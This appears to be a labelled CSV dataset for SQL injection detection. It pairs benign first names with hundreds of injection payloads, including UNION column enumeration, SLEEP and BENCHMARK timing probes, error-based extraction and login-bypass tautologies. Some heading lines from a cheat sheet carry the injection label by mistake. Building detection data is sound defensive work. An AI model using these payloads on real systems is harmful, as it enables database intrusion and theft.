"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'",SQL Injection
'Bob',Normal
'Eve',Normal
"'ORDER BY 1,SLEEP(5),3--'",SQL Injection
'-2',SQL Injection
'Hank',Normal
'Eve',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'",SQL Injection
'Bob',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5'",SQL Injection
'Bob',Normal
'John',Normal
'David',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--'",SQL Injection
'David',Normal
'Jill',Normal
'Bob',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
'David',Normal
'`	    Backtick',SQL Injection
'David',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9'",SQL Injection
'Eve',Normal
'Hank',Normal
'ORDER BY SLEEP(5)#',SQL Injection
'AND 1083=1083 AND (1427=1427',SQL Injection
'Alice',Normal
'Alice',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'",SQL Injection
'Grace',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#'",SQL Injection
'Eve',Normal
'Hank',Normal
'Alice',Normal
'Alice',Normal
'Hank',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
'Eve',Normal
'John',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'",SQL Injection
"'admin"""" #'",SQL Injection
'AS INJECTX WHERE 1=1 AND 1=0#',SQL Injection
'# Numeric',SQL Injection
'Grace',Normal
'Bob',Normal
'Grace',Normal
'ORDER BY 11--',SQL Injection
'Charlie',Normal
"'or benchmark(50000000,MD5(1))'",SQL Injection
'OR 1=0--',SQL Injection
'' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --',SQL Injection
'WHERE 1=1 AND 1=1#',SQL Injection
'Fran',Normal
"'"""" or """"""""-""""'",SQL Injection
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7'",SQL Injection
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--'",SQL Injection
'Eve',Normal
'Alice',Normal
'Jill',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--'",SQL Injection
'Hank',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
Microservice running on port 12345,Normal
'Hank',Normal
'ORDER BY 2#',SQL Injection
'John',Normal
'David',Normal
'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)',SQL Injection
'or true--',SQL Injection
'ORDER BY 26',SQL Injection
'or SLEEP(5)#',SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#'",SQL Injection
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#'",SQL Injection
'Charlie',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Eve',Normal
'Hank',Normal
'ORDER BY 3',SQL Injection
'John',Normal
'UNION ALL SELECT SLEEP(5)--',SQL Injection
'Bob',Normal
'Alice',Normal
'Charlie',Normal
'Fran',Normal
'Charlie',Normal
'AND 7506=9091 AND ('5913=5913',SQL Injection
'Grace',Normal
'Grace',Normal
'Grace',Normal
'Fran',Normal
'John',Normal
"'admin"""") or """"1""""=""""1""""--'",SQL Injection
'Bob',Normal
'Fran',Normal
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'",SQL Injection
'Fran',Normal
''-'',SQL Injection
'' OR '1',SQL Injection
'Fran',Normal
'Jill',Normal
"'ORDER BY 1,SLEEP(5),3,4#'",SQL Injection
'Jill',Normal
'David',Normal
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'",SQL Injection
'Eve',Normal
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4'",SQL Injection
'HAVING 1=1--',SQL Injection
'AND 1=0#',SQL Injection
'Bob',Normal
'Hank',Normal
"'1' ORDER BY 1,2,3--+'",SQL Injection
'admin') or ('1'='1'/*',SQL Injection
'Grace',Normal
'Charlie',Normal
'Bob',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'",SQL Injection
'Charlie',Normal
'Charlie',Normal
'Fran',Normal
'John',Normal
'Hank',Normal
'Charlie',Normal
'Jill',Normal
'Fran',Normal
'OR 1=1--',SQL Injection
'admin' or '1'='1'--',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
'Hank',Normal
'Bob',Normal
'Eve',Normal
'Jill',Normal
Microservice running on port 6000,Normal
'AND 1',SQL Injection
'Jill',Normal
'Hank',Normal
"'or benchmark(50000000,MD5(1))'",SQL Injection
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))--'",SQL Injection
'John',Normal
'Charlie',Normal
'Fran',Normal
'Charlie',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'",SQL Injection
'Eve',Normal
'David',Normal
'%2c(select%20*%20from%20(select(sleep(10)))a)',SQL Injection
'OR x=x',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
'David',Normal
'Bob',Normal
'David',Normal
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25'",SQL Injection
'ORDER BY SLEEP(5)--',SQL Injection
'Grace',Normal
'Grace',Normal
'Fran',Normal
'Hank',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17'",SQL Injection
'Grace',Normal
'Fran',Normal
'Eve',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#'",SQL Injection
'David',Normal
'Fran',Normal
'ORDER BY 22#',SQL Injection
'Grace',Normal
'Hank',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#'",SQL Injection
'Grace',Normal
'ORDER BY 6#',SQL Injection
'Alice',Normal
'Bob',Normal
'David',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))--'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))'",SQL Injection
'Jill',Normal
'Charlie',Normal
'Charlie',Normal
'ORDER BY 14#',SQL Injection
'David',Normal
'ORDER BY 4#',SQL Injection
'AND 1=1--',SQL Injection
'Charlie',Normal
'John',Normal
'Jill',Normal
'Eve',Normal
'Hank',Normal
"'"""" or sleep(5)=""""'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
'David',Normal
'ORDER BY 21--',SQL Injection
'John',Normal
'Hank',Normal
'Eve',Normal
'ORDER BY 7--',SQL Injection
'Alice',Normal
'John',Normal
'or 1=1#',SQL Injection
"'OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))'",SQL Injection
'Jill',Normal
'Bob',Normal
'Grace',Normal
'Grace',Normal
'Alice',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#'",SQL Injection
"'' or benchmark(10000000,MD5(1))#'",SQL Injection
'Grace',Normal
'John',Normal
'John',Normal
'Alice',Normal
'Fran',Normal
'AND 1083=1083 AND ('1427=1427',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#'",SQL Injection
'Grace',Normal
'Finding the table name',SQL Injection
'ORDER BY 4--',SQL Injection
'David',Normal
''LIKE'',SQL Injection
'AnD SLEEP(5)--',SQL Injection
'Jill',Normal
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
'Hank',Normal
"'') or benchmark(10000000,MD5(1))#'",SQL Injection
'Hank',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7'",SQL Injection
'Eve',Normal
'Charlie',Normal
'Bob',Normal
"'"""") or sleep(5)=""""'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
"'"""" or sleep(5)=""""'",SQL Injection
'ORDER BY 10--',SQL Injection
'AND 7300=7300 AND ('pKlZ'='pKlZ',SQL Injection
'Bob',Normal
'John',Normal
'Fran',Normal
'Fran',Normal
'AnD SLEEP(5)#',SQL Injection
'Jill',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
'Hank',Normal
'Grace',Normal
'John',Normal
'Charlie',Normal
'Charlie',Normal
'Eve',Normal
'1 or pg_sleep(5)--',SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'",SQL Injection
'Grace',Normal
'Grace',Normal
'Fran',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'",SQL Injection
'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',SQL Injection
'Grace',Normal
'admin') or ('1'='1'/*',SQL Injection
'Alice',Normal
'Fran',Normal
'ORDER BY SLEEP(5)',SQL Injection
'David',Normal
'Eve',Normal
'ORDER BY 8#',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--'",SQL Injection
'OR x=x',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
'OR 3409=3409 AND ('pytW' LIKE 'pytY',SQL Injection
'Alice',Normal
"'and (select substring(@@version,2,1))='y''",SQL Injection
'OR 1=0--',SQL Injection
'Grace',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Fran',Normal
'Fran',Normal
'Hank',Normal
'Eve',Normal
'John',Normal
"'"""";",SQL Injection
'AND true',SQL Injection
'%' AND 8310=8310 AND '%'='',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'",SQL Injection
'ORDER BY 2#',SQL Injection
'Eve',Normal
'Alice',Normal
'David',Normal
'Fran',Normal
'Alice',Normal
'Fran',Normal
'';,SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'",SQL Injection
'Alice',Normal
'RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
"'') or benchmark(10000000,MD5(1))#'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),3'",SQL Injection
'ORDER BY 4',SQL Injection
'Eve',Normal
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'",SQL Injection
'' '',SQL Injection
'Bob',Normal
'ORDER BY 30#',SQL Injection
'Alice',Normal
'David',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'",SQL Injection
'Bob',Normal
'ORDER BY 16',SQL Injection
'Eve',Normal
'David',Normal
'Bob',Normal
'1) or sleep(5)#',SQL Injection
'Charlie',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'",SQL Injection
'David',Normal
"'UNION ALL SELECT 1,2,3,4,5'",SQL Injection
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'",SQL Injection
''''''''''''''UNION SELECT '2',SQL Injection
'Grace',Normal
'||		(double pipe) concatenate',SQL Injection
'John',Normal
'John',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'",SQL Injection
''*'',SQL Injection
'\',SQL Injection
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--'",SQL Injection
'Charlie',Normal
'Grace',Normal
'Alice',Normal
'John',Normal
'Eve',Normal
'David',Normal
'Bob',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'",SQL Injection
'Charlie',Normal
'Fran',Normal
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8'",SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))'",SQL Injection
'Alice',Normal
'David',Normal
"'"""") or (""""x"""")=(""""x'",SQL Injection
'ORDER BY 7#',SQL Injection
'Eve',Normal
'OR 1=0#',SQL Injection
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'",SQL Injection
'admin' or '1'='1'--',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'",SQL Injection
'HAVING 1=0--',SQL Injection
'Bob',Normal
"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'",SQL Injection
'Comments:',SQL Injection
"'"""") or (""""x"""")=(""""x'",SQL Injection
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#'",SQL Injection
'Jill',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'",SQL Injection
'Charlie',Normal
'John',Normal
'Grace',Normal
'Hank',Normal
'' UNION SELECT sum(columnname ) from tablename --',SQL Injection
'ORDER BY 2--',SQL Injection
'David',Normal
'Grace',Normal
'Grace',Normal
'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --',SQL Injection
'David',Normal
"'admin"""") or (""""1""""=""""1""""#'",SQL Injection
'John',Normal
'Hank',Normal
'Grace',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--'",SQL Injection
"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'",SQL Injection
'Hank',Normal
'Charlie',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'",SQL Injection
'Hank',Normal
'Bob',Normal
'Fran',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'",SQL Injection
'Charlie',Normal
'Jill',Normal
'Alice',Normal
'Fran',Normal
'AS INJECTX WHERE 1=1 AND 1=0#',SQL Injection
'Hank',Normal
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'",SQL Injection
'Alice',Normal
"'and (select substring(@@version,2,1))='i''",SQL Injection
'ORDER BY 22',SQL Injection
'David',Normal
''-'',SQL Injection
'Charlie',Normal
'Bob',Normal
'Grace',Normal
'Grace',Normal
'' OR 'x'='x',SQL Injection
'Eve',Normal
'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'",SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8'",SQL Injection
'Hank',Normal
'Bob',Normal
'Alice',Normal
'AND 1=1--',SQL Injection
'Grace',Normal
'John',Normal
'Eve',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))'",SQL Injection
'Eve',Normal
'Bob',Normal
'David',Normal
'Fran',Normal
'Fran',Normal
"'UNION SELECT @@VERSION,SLEEP(5),3'",SQL Injection
'Fran',Normal
'Fran',Normal
'Grace',Normal
'Bob',Normal
'John',Normal
'%		wildcard attribute indicator',SQL Injection
'Jill',Normal
'Fran',Normal
'Hank',Normal
';',SQL Injection
'Hank',Normal
'Bob',Normal
"'1' GROUP BY 1,2,3--+'",SQL Injection
'Grace',Normal
'Fran',Normal
'Bob',Normal
'Jill',Normal
'Jill',Normal
'Eve',Normal
'Hank',Normal
'John',Normal
'David',Normal
'Eve',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Alice',Normal
'Charlie',Normal
'Bob',Normal
"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'",SQL Injection
'John',Normal
'Bob',Normal
'Fran',Normal
'Charlie',Normal
'Fran',Normal
"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'",SQL Injection
'Alice',Normal
'Fran',Normal
'David',Normal
'' or 'x'='x',SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'",SQL Injection
'John',Normal
'Grace',Normal
'UNION ALL SELECT NULL#',SQL Injection
'John',Normal
'' AND id IS NULL; --',SQL Injection
'Fran',Normal
'Grace',Normal
'Fran',Normal
'Jill',Normal
'Hank',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'",SQL Injection
'Hank',Normal
'John',Normal
"'UNION ALL SELECT 1,2,3,4--'",SQL Injection
'David',Normal
'Alice',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'",SQL Injection
'Grace',Normal
'Fran',Normal
'Alice',Normal
'Fran',Normal
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'",SQL Injection
'UNION ALL SELECT NULL--',SQL Injection
'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--',SQL Injection
'Jill',Normal
'Fran',Normal
'Jill',Normal
'||		(double pipe) concatenate',SQL Injection
'Alice',Normal
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'",SQL Injection
"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'",SQL Injection
"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--'",SQL Injection
'AND 1=1 AND '%'='',SQL Injection
'John',Normal
'Grace',Normal
'ORDER BY 31337--',SQL Injection
'Grace',Normal
'Hank',Normal
'Charlie',Normal
"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#'",SQL Injection
'John',Normal
'John',Normal
'';WAITFOR DELAY '0:0:30'--',SQL Injection
'David',Normal
'UNION ALL SELECT NULL',SQL Injection
'David',Normal
'Charlie',Normal
'John',Normal
'Bob',Normal
'Alice',Normal
'Hank',Normal
'Eve',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'",SQL Injection
'Fran',Normal
'OR 1=0--',SQL Injection
'Charlie',Normal
'John',Normal
'Fran',Normal
'David',Normal
"'admin"""" or 1=1/*'",SQL Injection
'Alice',Normal
'Charlie',Normal
'Charlie',Normal
'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='',SQL Injection
'Jill',Normal
"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'",SQL Injection
'Bob',Normal
'Grace',Normal
'ORDER BY SLEEP(5)#',SQL Injection
"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'",SQL Injection
'Bob',Normal
'David',Normal
'Hank',Normal
'Alice',Normal
